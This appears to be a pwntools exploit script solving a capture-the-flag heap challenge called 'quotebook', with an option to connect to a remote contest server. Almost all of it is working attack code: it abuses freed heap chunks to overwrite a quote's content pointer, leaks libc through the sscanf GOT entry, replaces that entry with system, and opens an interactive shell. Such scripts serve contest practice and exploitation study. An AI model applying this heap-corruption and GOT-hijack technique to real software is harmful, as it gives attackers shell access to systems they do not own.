#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template quotebook
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dist/quotebook')
libc = ELF('dist/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote('challs.dvc.tf', 2222)
    else:
        return process([exe.path] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

aids= 0
struct_size = 48

def make_quote(io, size = 10):
    global aids

    io.recvuntil('>')
    io.sendline('2')
    io.recvuntil('>')
    io.sendline('10')
    io.recvuntil('>')
    io.sendline(str(size))
    io.recvuntil('>')
    io.sendline(f'title{aids}')
    io.recvuntil('>')
    io.sendline(f'content{aids}')
    aids += 1

def delete_quote(io, n):
    global aids

    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('>')
    io.sendline(str(n))

def edit_quote(io, id, content):
    io.recvuntil('>')
    io.sendline('4')
    io.recvuntil('>')
    io.sendline(str(id))
    io.recvuntil('>')
    io.sendline(content)

def display_quote(io, id):
    io.recvuntil('>')
    io.sendline('3')
    io.recvuntil('>')
    io.sendline(str(id))
    io.recvline()
    content = io.recvline()[4:-1]
    return content


io = start()

# Allocate 10 quotes with as content
for _ in range(10):
    make_quote(io)

# Add two entries to fastbin
delete_quote(io, 1)
delete_quote(io, 2)

# Make a new quote which content pointer points to quote[0].content
make_quote(io, struct_size)

# Overwrite quote[0] content pointer to point to sscanf@got
edit_quote(io, 9, p64(exe.sym.got.__isoc99_sscanf))

# Leak sscanf@libc and shift libc addresses
content = display_quote(io, 1)
sscanf_address = u64(content.ljust(8, b'\x00'))
libc.address = sscanf_address - libc.sym.__isoc99_sscanf

# Overwrite sscanf entry with system
edit_quote(io, 1, p64(libc.sym.system))

# Prepare command for system
io.sendline('/bin/sh')

io.interactive()

